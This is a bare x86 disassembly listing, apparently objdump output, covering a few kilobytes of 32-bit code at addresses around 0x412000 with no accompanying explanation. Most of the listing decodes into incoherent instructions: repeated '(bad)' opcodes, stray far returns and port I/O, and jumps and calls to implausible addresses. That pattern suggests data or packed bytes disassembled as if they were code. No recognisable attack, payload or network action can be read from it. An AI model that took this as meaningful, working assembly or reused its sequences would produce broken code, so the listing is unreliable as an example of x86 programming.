  4121e6:	fbstp  TBYTE PTR [ecx-0x1ec39d70]
  4121ec:	repnz xchg ebp,eax
  4121ee:	xchg   ebp,eax
  4121f0:	mov    ah,0xd3
  4121f2:	stc    
  4121f3:	adc    al,0xa8
  4121f5:	pusha  
  4121f6:	jo     0x412186
  4121f8:	push   eax
  4121f9:	mov    ebp,0x73d2e7e5
  4121fe:	arpl   ax,bp
  412200:	mov    ds:0x9f5f79fb,eax
  412205:	mov    BYTE PTR [ecx-0x5b7d9778],bl
  41220b:	ins    BYTE PTR es:[di],dx
  41220d:	xchg   ecx,eax
  41220e:	pop    ds
  41220f:	mov    cl,0x22
  412211:	jne    0x4121cf
  412213:	and    eax,0xc6e23656
  412218:	fisub  DWORD PTR [ebx+ecx*1+0x7]
  41221c:	push   ebp
  41221d:	pop    edi
  41221e:	push   ds
  41221f:	jle    0x41222e
  412221:	mov    esi,0x1b0562a9
  412226:	addr16 retf 
  412228:	pop    eax
  412229:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41222a:	imul   eax,DWORD PTR [ebx+ebp*4-0x63],0x4b
  41222f:	xor    edx,edx
  412231:	add    DWORD PTR [ebp-0xc],ebx
  412234:	pop    ebx
  412235:	mov    eax,DWORD PTR [ebp-0xc]
  412238:	pop    edi
  412239:	pop    esi
  41223a:	pop    ebx
  41223b:	leave  
  41223c:	ret    0x10
  41223f:	dec    ebp
  412240:	push   ebp
  412241:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  412247:	mov    esp,ebp
  412249:	or     ah,dh
  41224b:	dec    ebp
  41224c:	add    bh,al
  41224e:	add    BYTE PTR [eax],cl
  412250:	add    BYTE PTR [eax],al
  412252:	mov    DWORD PTR [eax],0x40f44545
  412258:	xor    DWORD PTR [eax],eax
  41225a:	test   DWORD PTR [ebx-0x34070b64],ecx
  412260:	(bad)  
  412261:	enter  0x4d45,0xbc
  412265:	mov    esi,DWORD PTR [eax]
  412267:	hlt    
  412268:	test   ebx,ecx
  41226a:	pushf  
  41226b:	enter  0x4df8,0x8b
  41226f:	mov    DWORD PTR [ebp-0x20],0x890208
  412276:	inc    ebp
  412277:	inc    ebp
  412278:	cld    
  412279:	xor    cl,BYTE PTR [ebx-0xb38b300]
  41227f:	or     BYTE PTR [ebx+0x0],dl
  412282:	mov    ebx,0x8bd5500
  412287:	call   DWORD PTR [ecx-0x1]
  41228a:	pop    es
  41228b:	mov    ch,0x33
  41228d:	dec    ebx
  41228f:	(bad)  
  412290:	mov    eax,0x72009ca4
  412295:	push   DWORD PTR [edx]
  412297:	or     BYTE PTR [eax],al
  412299:	jmp    0xff89:0x75c84d03
  4122a0:	dec    ebp
  4122a1:	loopne 0x412273
  4122a3:	ror    BYTE PTR [ebx-0xbf5b2bb],cl
  4122a9:	add    BYTE PTR [ebx],dh
  4122ab:	mov    ecx,ebx
  4122ad:	hlt    
  4122ae:	add    ecx,ebx
  4122b0:	enter  0x899c,0x32
  4122b4:	dec    ebp
  4122b5:	add    ecx,eax
  4122b7:	mov    DWORD PTR [ebx-0xbb2b2f8],ecx
  4122bd:	or     DWORD PTR [ebx-0xb00b29c],0x0
  4122c4:	xor    ecx,ebx
  4122c6:	retf   
  4122c7:	enter  0x4d03,0xc8
  4122cb:	mov    DWORD PTR fs:[eax],ebx
  4122ce:	lea    eax,[eax]
  4122d0:	push   esp
  4122d1:	mov    edi,edi
  4122d3:	fs (bad) 
  4122d5:	(bad)  
  4122d6:	dec    DWORD PTR [ebx-0x7aa8cfaa]
  4122dc:	push   0xffffffff
  4122de:	and    bh,bh
  4122e0:	pop    ecx
  4122e1:	inc    eax
  4122e2:	mov    DWORD PTR [ecx-0xb2aff8],ecx
  4122e8:	push   0xffffff8b
  4122ea:	pop    ecx
  4122eb:	cld    
  4122ec:	dec    ebp
  4122ed:	lea    ecx,[ecx+0x45ff08ff]
  4122f3:	mov    BYTE PTR [edx+0x1],cl
  4122f6:	add    BYTE PTR [eax],al
  4122f8:	mov    DWORD PTR [ebp+0x8],0x58008d
  4122ff:	dec    DWORD PTR [ebp-0x77]
  412302:	xor    esp,DWORD PTR [ebx+eax*1+0x88b8900]
  412309:	cld    
  41230a:	dec    ebp
  41230b:	jne    0x412340
  41230d:	lea    eax,[ebx]
  41230f:	push   eax
  412310:	mov    edi,edi
  412312:	or     BYTE PTR [ecx+0x54a845],cl
  412318:	add    al,ch
  41231a:	(bad)  
  41231b:	sub    esp,ebp
  41231d:	add    BYTE PTR [eax],al
  41231f:	rol    BYTE PTR [eax],0x84
  412322:	inc    ebp
  412323:	add    dh,BYTE PTR [esi+0x0]
  412326:	add    BYTE PTR [ebp-0x73],al
  412329:	mov    ebp,DWORD PTR [esp+edx*4]
  41232c:	inc    DWORD PTR [eax]
  41232e:	lea    ecx,[ebx-0x30074f4]
  412334:	call   0x422eb9
  412339:	add    BYTE PTR [ebp+0x0],cl
  41233c:	jne    0x41237f
  41233e:	dec    DWORD PTR [ebx-0x76210314]
  412344:	dec    ebp
  412345:	add    DWORD PTR [ebp+0x0],esi
  412348:	(bad)  
  412349:	xchg   ebp,eax
  41234a:	loopne 0x41234b
  41234c:	inc    eax
  41234d:	inc    DWORD PTR [eax]
  41234f:	mov    ecx,DWORD PTR [ebp-0x4]
  412352:	xor    edx,DWORD PTR [edx+0x7201b8]
  412358:	add    BYTE PTR [edx],dl
  41235a:	enter  0x4d90,0x0
  41235e:	mov    eax,DWORD PTR [eax]
  412360:	hlt    
  412361:	add    al,0xa5
  412363:	mov    al,0xff
  412365:	add    bh,bh
  412367:	add    BYTE PTR [ebx],dh
  412369:	inc    DWORD PTR [ebx]
  41236b:	sbb    al,0x89
  41236d:	jne    0x412347
  41236f:	mov    esp,DWORD PTR [ecx+0x4500fc]
  412375:	mov    eax,DWORD PTR [ebp-0xff0048]
  41237b:	mov    DWORD PTR [eax-0x70],0xee58ed89
  412382:	inc    DWORD PTR [ebp-0x75]
  412385:	fisttp QWORD PTR [eax+eiz*8]
  412388:	test   DWORD PTR [esi-0x1],esp
  41238b:	inc    ebp
  41238c:	(bad)  
  41238d:	aas    
  41238e:	inc    ebp
  41238f:	(bad)  
  412390:	lea    edi,[esp+eiz*2-0x1]
  412394:	inc    edi
  412396:	mov    DWORD PTR ds:0x8000c7a0,edi
  41239c:	mov    ebp,esi
  41239e:	cld    
  41239f:	in     al,0x8d
  4123a1:	inc    ebp
  4123a2:	jmp    eax
  4123a4:	(bad)  
  4123a5:	fisttp WORD PTR [eax+0x8801c7]
  4123ab:	jecxz  0x4123f2
  4123ad:	out    dx,al
  4123ae:	inc    DWORD PTR [ebp-0x4]
  4123b1:	out    0x8d,eax
  4123b3:	aas    
  4123b4:	inc    edi
  4123b6:	jmp    FWORD PTR [eax-0x78]
  4123b9:	inc    DWORD PTR [ecx]
  4123bb:	mov    DWORD PTR [eax],0xc7a83d
  4123c1:	ins    BYTE PTR es:[edi],dx
  4123c2:	test   edi,edi
  4123c4:	pandn  mm0,mm5
  4123c7:	aas    
  4123c8:	add    bh,al
  4123ca:	mov    esi,DWORD PTR [eax-0x4]
  4123cd:	inc    DWORD PTR [eax+0xdf01e0]
  4123d3:	(bad)  
  4123d4:	or     BYTE PTR [ebp+eax*2-0x1],dh
  4123d8:	mov    ebp,ebx
  4123da:	xchg   esp,eax
  4123db:	fild   DWORD PTR [eax]
  4123dd:	(bad)  
  4123de:	mov    edi,DWORD PTR [eax+0x3]
  4123e1:	(bad)  
  4123e2:	cmp    al,0xe7
  4123e4:	dec    ebp
  4123e5:	leave  
  4123e6:	mov    ebp,eax
  4123e8:	fsubr  DWORD PTR [ecx]
  4123ea:	add    BYTE PTR [eax],al
  4123ec:	lea    ecx,[ebx-0x7f0003b4]
  4123f2:	push   edx
  4123f3:	add    DWORD PTR [ebp+0x0],edx
  4123f6:	mov    esi,DWORD PTR [eax]
  4123f8:	mov    WORD PTR [ebx-0x7a750000],?
  4123fe:	add    esi,DWORD PTR [ebp-0x78]
  412401:	mov    eax,DWORD PTR [eax]
  412403:	cld    
  412404:	push   0x7d
  412406:	dec    DWORD PTR [ebx+0xd88c]
  41240c:	push   edx
  41240d:	mov    edx,DWORD PTR [ecx-0x4]
  412410:	call   DWORD PTR [eax+0x7d01fc]
  412416:	mov    ebx,edx
  412418:	cld    
  412419:	add    BYTE PTR [eax+0x560150],dl
  41241f:	test   DWORD PTR [ebp+0x75],eax
  412422:	in     al,0x8b
  412424:	in     al,dx
  412425:	cld    
  412426:	(bad)  
  412427:	jge    0x4123bd
  412429:	mov    esp,ebx
  41242b:	fsub   st,st(7)
  41242d:	add    bh,al
  41242f:	mov    ebx,DWORD PTR [eax-0x7a6f8f04]
  412435:	add    edi,edi
  412437:	add    bh,bh
  412439:	mov    eax,0x50d800ed
  41243e:	inc    ebp
  41243f:	push   esi
  412440:	fisttp WORD PTR [ebx+0x4dc7f43f]
  412446:	test   BYTE PTR [ebx],dh
  412448:	fadd   DWORD PTR ds:0x4572c2
  41244e:	jmp    0x412411
  412450:	fild   DWORD PTR [edi+eax*8-0x22ff73ff]
  412457:	inc    esi
  412458:	jo     0x41245a
  41245a:	test   edi,eax
  41245c:	jmp    esp
  41245e:	inc    DWORD PTR [eax]
  412460:	in     eax,dx
  412461:	add    al,bl
  412463:	jne    0x4123ea
  412465:	mov    edi,edi
  412467:	cld    
  412468:	inc    DWORD PTR [ebp-0x12]
  41246b:	mov    esp,esp
  41246d:	mov    ah,0x85
  41246f:	add    bh,bh
  412471:	call   0x1194d75
  412476:	ret    0x858b
  412479:	cld    
  41247a:	inc    DWORD PTR [eax+0xe301ff]
  412480:	out    dx,al
  412481:	xor    BYTE PTR [ebp-0xff00cf],al
  412487:	mov    ebx,ebp
  412489:	cld    
  41248a:	jo     0x412415
  41248c:	or     DWORD PTR [ecx],eax
  41248e:	add    BYTE PTR [eax],al
  412490:	push   eax
  412491:	add    DWORD PTR [ebp+0x45],eax
  412494:	mov    ecx,DWORD PTR [ebx+0xd8a8]
  41249a:	dec    DWORD PTR [ebx-0x3fda0318]
  4124a0:	add    BYTE PTR [ebp-0xbf0040],dl
  4124a6:	inc    ebp
  4124a7:	or     BYTE PTR [ebx-0x4faf0400],0x45
  4124ae:	add    DWORD PTR [ebx+0x459c00],ecx
  4124b4:	mov    edi,edi
  4124b6:	mov    eax,0xe80800ff
  4124bb:	inc    ebp
  4124bc:	sub    BYTE PTR [ebx-0x47000400],cl
  4124c2:	add    al,0x1
  4124c4:	rol    BYTE PTR [eax],0x1e
  4124c7:	jne    0x41250e
  4124c9:	xor    ecx,DWORD PTR [ebx-0x4f830373]
  4124cf:	inc    DWORD PTR [ecx]
  4124d1:	call   0x864cd6
  4124d6:	mov    ecx,DWORD PTR [ebx-0x7fff0348]
  4124dc:	call   0x414ce2
  4124e1:	xor    bh,bh
  4124e3:	push   edi
  4124e4:	adc    BYTE PTR [ebx-0x747423bb],al
  4124ea:	loopne 0x4124c8
  4124ec:	ret    
  4124ed:	loopne 0x41248b
  4124ef:	xor    DWORD PTR [edx],0x31
  4124f2:	cmp    edi,edi
  4124f4:	bswap  esp
  4124f6:	rol    BYTE PTR gs:[eax],0x5
  4124fa:	jmp    0x12c2644
  4124ff:	mov    eax,DWORD PTR [ebp-0x4]
  412502:	add    BYTE PTR [eax+0xff0100],bh
  412508:	cld    
  412509:	jne    0x412588
  41250b:	xor    ecx,DWORD PTR [ebx-0x6f6f0373]
  412511:	push   ss
  412512:	add    DWORD PTR [eax],eax
  412514:	add    BYTE PTR [eax+0x7f],dl
  412517:	inc    ebp
  412518:	add    BYTE PTR [ebx+0x459850],cl
  41251e:	mov    edi,edi
  412520:	test   al,0xff
  412522:	add    BYTE PTR [eax],cl
  412524:	inc    DWORD PTR [ebp-0x18]
  412527:	jmp    DWORD PTR ds:0x4d7d00dc
  41252d:	adc    BYTE PTR [ebx+0x459cb9],cl
  412533:	mov    ecx,DWORD PTR [ecx-0x33c7404]
  412539:	pushf  
  41253a:	mov    eax,0x30132
  41253f:	lea    esi,[ebp+0x2c]
  412542:	xor    edi,edi
  412544:	(bad)  
  412545:	call   0x1404cb2
  41254a:	call   0x1354dda
  41254f:	jne    0x4124dc
  412551:	xor    edi,esp
  412553:	add    eax,DWORD PTR [eax+0xc018d]
  412559:	push   DWORD PTR [eax]
  41255b:	call   0xca4cb7
  412560:	int3   
  412561:	inc    DWORD PTR [ebp-0x14]
  412564:	mov    ecx,DWORD PTR [ebp-0x28]
  412567:	xor    eax,DWORD PTR [eax]
  412569:	add    ecx,DWORD PTR [ebx-0x3f8a03c5]
  41256f:	(bad)  
  412570:	xchg   ebp,eax
  412571:	in     al,0xff
  412573:	add    bh,bh
  412575:	add    BYTE PTR [ebp+0x45],dl
  412578:	add    BYTE PTR [ebx-0x3cbaf7b0],cl
  41257e:	mov    eax,DWORD PTR [esp+ebx*4-0xcdff64]
  412585:	mov    edi,edi
  412587:	or     BYTE PTR [eax],cl
  412589:	inc    ebp
  41258a:	test   DWORD PTR gs:[eax],eax
  41258d:	je     0x4125d4
  41258f:	mov    eax,DWORD PTR [ebx-0x3fb2f844]
  412595:	xor    edx,DWORD PTR [eax-0x73]
  412598:	push   ebp
  412599:	or     BYTE PTR [ebp+0x21007572],al
  41259f:	inc    ebp
  4125a0:	in     al,dx
  4125a1:	mov    ebp,DWORD PTR [eax]
  4125a3:	mov    esp,0x648bc345
  4125a8:	fmul   st,st(5)
  4125aa:	add    BYTE PTR [ebx],ch
  4125ac:	mov    eax,DWORD PTR [ebx]
  4125ae:	cld    
  4125af:	loopne 0x412571
  4125b1:	inc    ebp
  4125b2:	push   ebp
  4125b3:	cmp    ebp,eax
  4125b5:	movaps xmm4,XMMWORD PTR [eax-0x74740100]
  4125bc:	cld    
  4125bd:	fadd   DWORD PTR [eax+0x3b014d]
  4125c3:	jne    0x4125f5
  4125c5:	push   0xf8898557
  4125ca:	in     al,dx
  4125cb:	jne    0x412612
  4125cd:	lea    eax,[ebx+0x72e8dcc8]
  4125d3:	das    
  4125d4:	mov    eax,DWORD PTR [eax]
  4125d6:	mov    esp,0x33eb7545
  4125db:	mov    edi,DWORD PTR [edi+0x4572bc]
  4125e1:	xor    eax,edi
  4125e3:	adc    DWORD PTR [ebp-0xcd0064],0x8be131
  4125ed:	rcl    BYTE PTR [eax-0x40],1
  4125f0:	inc    ebp
  4125f1:	lock mov eax,DWORD PTR [esp+edi*8-0x38ff3cf9]
  4125f9:	inc    ebp
  4125fa:	xchg   ebp,eax
  4125fb:	ud0    ebp,DWORD PTR [ebx]
  4125fe:	inc    DWORD PTR [eax]
  412600:	retf   
  412601:	jbe    0x412603
  412603:	mov    dl,BYTE PTR [eax-0x80]
  412606:	push   ebp
  412607:	pop    ds
  412608:	mov    ecx,DWORD PTR [esp+esi*8]
  41260b:	inc    eax
  41260c:	retf   
  41260d:	inc    ebp
  41260e:	iret   
  41260f:	jb     0x4125d9
  412611:	mov    eax,DWORD PTR [edi]
  412613:	enter  0x4545,0x1
  412617:	xor    DWORD PTR [eax],eax
  412619:	pushf  
  41261a:	mov    ecx,DWORD PTR [ecx+0x304df0bc]
  412620:	xor    ebx,DWORD PTR [ebp+ecx*4+0x72e00889]
  412627:	dec    ebp
  412628:	add    BYTE PTR [ebx],dh
  41262a:	inc    ebp
  41262b:	mov    DWORD PTR [ebx-0x3f631b4c],ecx
  412631:	xor    dl,BYTE PTR [edx]
  412633:	add    eax,DWORD PTR [ebp-0x77]
  412636:	mov    eax,esp
  412638:	fmul   DWORD PTR [ebp-0x3d]
  41263b:	xor    eax,DWORD PTR [ebx+eax*1+0x832899c]
  412642:	mov    DWORD PTR [ebp-0x28],eax
  412645:	rol    DWORD PTR [ebp-0x64],1
  412648:	xor    eax,edi
  41264a:	mov    ecx,0xff858db0
  41264f:	clc    
  412650:	enter  0x4d45,0x32
  412654:	mov    ebx,DWORD PTR [eax+ecx*1-0x795b3e39]
  41265b:	test   esi,edi
  41265d:	clc    
  41265e:	inc    DWORD PTR [ebp+0x45]
  412661:	cmp    al,0x8b
  412663:	pushf  
  412664:	or     bh,al
  412666:	enter  0x16a8,0x85
  41266a:	xor    eax,edi
  41266c:	pushf  
  41266d:	inc    ebp
  41266e:	(bad)  
  41266f:	ds cld 
  412671:	pushf  
  412672:	inc    ebp
  412673:	mov    edx,DWORD PTR [eax-0x28]
  412676:	lock push ebp
  412678:	add    BYTE PTR [ebx],dh
  41267a:	mov    DWORD PTR [ebx],eax
  41267c:	sar    BYTE PTR [ebx],1
  41267e:	adc    BYTE PTR [edi],cl
  412680:	dec    ebp
  412681:	adc    al,0x8b
  412683:	add    al,dl
  412685:	jmp    0x1022855
  41268a:	jb     0x4126d9
  41268c:	add    BYTE PTR [ebx-0x2e8a0ff8],cl
  412692:	xor    ecx,DWORD PTR [ebp+0x3b]
  412695:	xor    ecx,DWORD PTR [edi]
  412697:	add    ecx,DWORD PTR [ebx+edi*1+0x0]
  41269b:	(bad)  
  41269d:	clc    
  41269e:	enter  0x8400,0x8b
  4126a2:	pop    es
  4126a3:	mov    al,0x0
  4126a5:	push   ebp
  4126a6:	push   cs
  4126a7:	xor    ecx,eax
  4126a9:	xor    esp,ecx
  4126ab:	add    ebp,DWORD PTR [eax]
  4126ad:	add    esi,DWORD PTR [eax]
  4126af:	(bad)  
  4126b1:	retf   0x55c8
  4126b4:	repnz mov eax,DWORD PTR [ebp-0x10]
  4126b8:	(bad)  
  4126b9:	cli    
  4126ba:	fdivr  st,st(1)
  4126bc:	test   DWORD PTR [eax+edi*8],ecx
  4126bf:	dec    ebp
  4126c0:	inc    ebp
  4126c1:	xor    edi,DWORD PTR [eax-0x7167afd]
  4126c7:	add    BYTE PTR [ebp+0x0],al
  4126ca:	mov    ecx,DWORD PTR [ebp-0x28]
  4126cd:	mov    ecx,ebx
  4126cf:	clc    
  4126d0:	jne    0x41269d
  4126d2:	mov    esi,0xd672d3
  4126d7:	into   
  4126d8:	into   
  4126d9:	scas   eax,DWORD PTR es:[edi]
  4126da:	dec    ebp
  4126db:	mov    ecx,DWORD PTR [ebx-0x3482273c]
  4126e1:	sub    ecx,esi
  4126e3:	cmp    ecx,DWORD PTR [ebp+0x77]
  4126e6:	(bad)  
  4126e7:	mov    edi,eax
  4126e9:	mov    al,0x85
  4126eb:	mov    eax,edi
  4126ed:	add    BYTE PTR [ebp-0x75],al
  4126f0:	xor    esp,DWORD PTR [esp+ebx*4-0x47cc38ab]
  4126f7:	xor    eax,DWORD PTR [ebp+0x4503f803]
  4126fd:	(bad)  
  4126ff:	retf   0x559c
  412702:	(bad)  
  412703:	mov    ebp,DWORD PTR [eax+esi*8-0x607057b]
  41270a:	inc    ebp
  41270b:	add    eax,0xeb9c4d3f
  412710:	(bad)  
  412711:	mov    ecx,esp
  412713:	lods   al,BYTE PTR ds:[esi]
  412714:	test   DWORD PTR [ebp-0x8],edx
  412717:	xor    ecx,DWORD PTR [ebp+0x33]
  41271a:	mov    eax,DWORD PTR [ebx]
  41271c:	lock add ecx,ebx
  41271f:	bswap  esi
  412721:	retf   0x55d1
  412724:	test   BYTE PTR [ebx-0x5ff0ffe],cl
  41272a:	jmp    0x412725
  41272c:	add    BYTE PTR ds:0xebc44d8b,al
  412732:	push   ebp
  412733:	mov    ebp,DWORD PTR [ebx]
  412735:	test   al,0x8b
  412737:	push   ebp
  412738:	clc    
  412739:	xor    ecx,ebx
  41273b:	xor    ecx,esi
  41273d:	add    edx,ecx
  41273f:	add    eax,DWORD PTR [edx+0xca010f]
  412745:	push   ebp
  412746:	dec    ebp
  412747:	mov    ecx,DWORD PTR [ebx-0x34050710]
  41274d:	stc    
  41274e:	rol    DWORD PTR ds:0xebce4dd6,cl
  412754:	scas   eax,DWORD PTR es:[edi]
  412755:	mov    ecx,DWORD PTR [ebx+0x7d55c4cc]
  41275b:	xor    ebp,DWORD PTR [ebx]
  41275d:	xor    edi,DWORD PTR [ebx]
  41275f:	add    esi,DWORD PTR [edi+0x3]
  412762:	mov    ecx,DWORD PTR [edi]
  412764:	clc    
  412765:	retf   0x55cb
  412768:	into   
  412769:	mov    edi,DWORD PTR [eax+esi*8-0x6740600]
  412770:	mov    eax,0x3376554d
  412775:	mov    esi,DWORD PTR [ebx]
  412777:	int3   
  412778:	add    edx,DWORD PTR [ebp+0x3]
  41277b:	xor    ecx,DWORD PTR [edi]
  41277d:	xor    ecx,edx
  41277f:	add    edx,DWORD PTR [ebp+0x3]
  412782:	mov    ecx,DWORD PTR [edi]
  412784:	lock retf 0x4dfa
  412788:	stc    
  412789:	mov    ecx,DWORD PTR [eax]
  41278b:	or     BYTE PTR [ebp+0x4d],cl
  41278e:	jmp    0x105281e
  412793:	dec    ebp
  412794:	dec    ebp
  412795:	(bad)  
  412796:	mov    ebx,esp
  412798:	clc    
  412799:	test   ebx,ecx
  41279b:	clc    
  41279c:	ror    DWORD PTR [ebp-0x2a],cl
  41279f:	mov    esi,ecx
  4127a1:	call   0x33cc6d55
  4127a6:	les    ebx,FWORD PTR [ebp+edi*2+0x3bdc2b8b]
  4127ad:	retf   
  4127ae:	ja     0x41277e
  4127b0:	mov    ebp,DWORD PTR [eax-0x48]
  4127b3:	dec    ebp
  4127b4:	xor    ecx,DWORD PTR [di+0x3]
  4127b8:	mov    esp,esp
  4127ba:	clc    
  4127bb:	push   ebp
  4127bc:	retf   
  4127bd:	mov    dl,bl
  4127bf:	adc    esi,edx
  4127c1:	jb     0x412791
  4127c3:	add    BYTE PTR [edi-0x3b7474b3],ch
  4127c9:	call   0x4d6cf34b
  4127ce:	cmp    ecx,DWORD PTR [ebx-0x73742789]
  4127d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4127d5:	pushf  
  4127d6:	inc    ebp
  4127d7:	xor    cl,BYTE PTR [ebp-0x78]
  4127da:	mov    edx,edi
  4127dc:	clc    
  4127dd:	dec    ebp
  4127de:	retf   
  4127df:	mov    edx,ebx
  4127e1:	call   0x560ffbbc
  4127e6:	scas   eax,DWORD PTR es:[edi]
  4127e7:	mov    ecx,DWORD PTR [ebx+0x7d8cc4d8]
  4127ed:	pushf  
  4127ee:	sub    esi,DWORD PTR [edx]
  4127f0:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  4127f6:	lods   al,BYTE PTR ds:[esi]
  4127f7:	xor    esp,DWORD PTR [ebx]
  4127f9:	add    ecx,DWORD PTR [ebp-0x1c]
  4127fc:	mov    edi,DWORD PTR [ebp-0x8]
  4127ff:	mov    bl,cl
  412801:	cmp    dl,bl
  412803:	jb     0x4127d3
  412805:	add    dh,dl
  412807:	dec    ebp
  412808:	scas   eax,DWORD PTR es:[edi]
  412809:	mov    ecx,DWORD PTR [ebx+0x7dcbc4e8]
  41280f:	shr    DWORD PTR [ebx],cl
  412811:	into   
  412812:	cmp    edx,esi
  412814:	mov    ebp,DWORD PTR [edi-0x1bfcfc58]
  41281a:	dec    ebp
  41281b:	dec    ebp
  41281c:	mov    ecx,DWORD PTR [ebx+0x55d3e8f8]
  412822:	retf   
  412823:	xor    edx,esi
  412825:	add    ecx,esi
  412827:	imul   ecx,edx
  41282a:	mov    DWORD PTR [ebp+0x8],edx
  41282d:	xor    ecx,DWORD PTR [ebp+0x2b]
  412830:	mov    DWORD PTR [ebx+0x7d4de8ec],ecx
  412836:	add    esi,DWORD PTR [ebx]
  412838:	mov    ah,0x3
  41283a:	inc    ebp
  41283b:	rdtsc  
  41283d:	xlat   BYTE PTR ds:[ebx]
  41283e:	pushf  
  41283f:	jge    0x4127ca
  412841:	xor    ebx,eax
  412843:	sub    eax,DWORD PTR [ebp-0x73]
  412846:	(bad)  
  412847:	cmp    al,al
  412849:	jb     0x4127d0
  41284b:	add    al,bh
  41284d:	ror    DWORD PTR [ebp-0x7a],1
  412850:	xor    edi,edi
  412852:	add    edi,edi
  412854:	jmp    0x4128a3
  412856:	mov    ecx,DWORD PTR [ebx-0x34341324]
  41285c:	dec    ebp
  41285d:	into   
  41285e:	mov    ebp,DWORD PTR [edi-0x23737428]
  412864:	pushf  
  412865:	shl    DWORD PTR [edx],cl
  412867:	retf   0x5588
  41286a:	or     ecx,DWORD PTR [ebp+0x7233114d]
  412870:	add    eax,DWORD PTR [eax]
  412872:	in     al,0x4d
  412874:	push   ebp
  412875:	mov    ecx,DWORD PTR [edx+0x72cb11e0]
  41287b:	fs add ch,cl
  41287e:	dec    ebp
  41287f:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  412885:	dec    ebp
  412886:	xor    ecx,DWORD PTR [ebx-0x341b3bfd]
  41288c:	jge    0x41285c
  41288e:	mov    BYTE PTR [edi+0xf723b3a],ch
  412894:	add    cl,dh
  412896:	dec    ebp
  412897:	dec    DWORD PTR [ebx-0x2c032375]
  41289d:	adc    BYTE PTR [ebp+0x1],0x8b
  4128a1:	add    al,bl
  4128a3:	jge    0x412831
  4128a5:	push   0xffffff9c
  4128a7:	push   0x8b3032
  4128ac:	shl    BYTE PTR [ebp+0x55],0x6a
  4128b0:	xor    edi,edi
  4128b2:	xor    edx,DWORD PTR [ebx+eax*1]
  4128b5:	inc    ebp
  4128b6:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  4128bc:	dec    ebp
  4128bd:	or     BYTE PTR [ecx+0x4dc8e483],cl
  4128c3:	jbe    0x412850
  4128c5:	mov    ebp,esp
  4128c7:	ror    bl,1
  4128c9:	enter  0x14ce,0xaf
  4128cd:	dec    DWORD PTR [ebx-0x2cef17f8]
  4128d3:	push   ebp
  4128d4:	retf   0x5540
  4128d7:	push   ebp
  4128d8:	mov    esi,DWORD PTR [edx-0x1c]
  4128db:	mov    edx,ebx
  4128dd:	cld    
  4128de:	(bad)  
  4128df:	sub    BYTE PTR [edi-0x23ff74ff],0x0
  4128e6:	sti    
  4128e7:	add    dh,cl
  4128e9:	push   0xffffff94
  4128eb:	call   FWORD PTR [eax+edx*8-0x74c4afce]
  4128f2:	bswap  esp
  4128f4:	pop    esi
  4128f5:	inc    ebp
  4128f6:	dec    DWORD PTR [ecx+0x45e8c88b]
  4128fc:	push   ebp
  4128fd:	xor    esi,DWORD PTR [ebx]
  4128ff:	mov    DWORD PTR [ebx],0xcac00f9c
  412905:	aas    
  412906:	push   ebp
  412907:	inc    ebp
  412908:	xor    ecx,eax
  41290a:	add    ecx,eax
  41290c:	mov    eax,DWORD PTR [ebx]
  41290e:	(bad)  
  41290f:	jmp    0x41289d
  412911:	mov    bl,BYTE PTR [ebp+eax*1-0x2f7674ce]
  412918:	les    edi,FWORD PTR [esi-0xeccefb3]
  41291e:	mov    edx,0xff378d80
  412923:	mov    dh,0xd1
  412925:	cmp    edx,DWORD PTR [ebp+0xf]
  412928:	mov    eax,DWORD PTR [edx-0x20]
  41292b:	add    BYTE PTR [ebp-0x75],bh
  41292e:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  412935:	pushf  
  412936:	retf   0x8632
  412939:	cmp    ebp,0x8
  41293c:	call   ebx
  41293e:	inc    ebp
  41293f:	inc    ebp
  412940:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  412946:	mov    esi,DWORD PTR [ecx]
  412948:	enter  0x49c,0xc7
  41294c:	add    al,al
  41294e:	add    bl,al
  412950:	(bad)  
  412951:	clc    
  412952:	enter  0x45,0x31
  412956:	push   eax
  412957:	pushf  
  412958:	mov    edi,eax
  41295a:	int3   
  41295b:	or     al,al
  41295d:	test   DWORD PTR [edi],edi
  41295f:	clc    
  412960:	gs inc ebp
  412962:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  412968:	push   ss
  412969:	xor    ecx,DWORD PTR [ebp+0x3]
  41296c:	sub    edx,DWORD PTR [ecx-0x76]
  41296f:	dec    ebp
  412970:	add    DWORD PTR [ebx+0x88d845],ecx
  412976:	mov    esi,DWORD PTR [ebx]
  412978:	or     BYTE PTR [ebx],al
  41297a:	cmp    edx,DWORD PTR [ecx-0x38]
  41297d:	dec    ebp
  41297e:	out    dx,eax
  41297f:	xor    eax,DWORD PTR [ebp+0x3]
  412982:	mov    edx,DWORD PTR [ecx-0x28]
  412985:	dec    ebp
  412986:	add    BYTE PTR [ebx],dh
  412988:	push   0x518003
  41298d:	push   eax
  41298e:	add    BYTE PTR [ebx-0x300748b],cl
  412994:	sbb    BYTE PTR [ebp+0x45],cl
  412997:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  41299d:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  4129a3:	dec    ebp
  4129a4:	inc    ebp
  4129a5:	xor    ecx,eax
  4129a7:	add    ecx,eax
  4129a9:	push   ecx
  4129aa:	(bad)  
  4129ab:	dec    ebp
  4129ac:	mov    al,ds:0xc5e03dff
  4129b1:	retf   
  4129b2:	(bad)  
  4129b3:	into   
  4129b4:	sub    bh,bh
  4129b6:	dec    esp
  4129b7:	adc    al,0x9c
  4129b9:	inc    ebp
  4129ba:	push   ebp
  4129bb:	test   DWORD PTR [edi],ecx
  4129bd:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab8ff80]
  4129c4:	jmp    0xc9ba38d8
  4129c9:	add    cl,dl
  4129cb:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  4129d5:	xor    ecx,DWORD PTR [ebp+0x728b089c]
  4129db:	rol    BYTE PTR [eax],0x55
  4129de:	clc    
  4129df:	fs jb  0x4129e9
  4129e2:	mov    eax,DWORD PTR [ebp-0x30]
  4129e5:	xor    al,0x40
  4129e7:	sub    al,0xc7
  4129e9:	mov    ah,ch
  4129eb:	add    DWORD PTR [ebp+0x4534f845],eax
  4129f1:	sub    al,0x86
  4129f3:	mov    BYTE PTR [edx+eax*1-0x335a39],bl
  4129fa:	mov    ch,0xff
  4129fc:	clc    
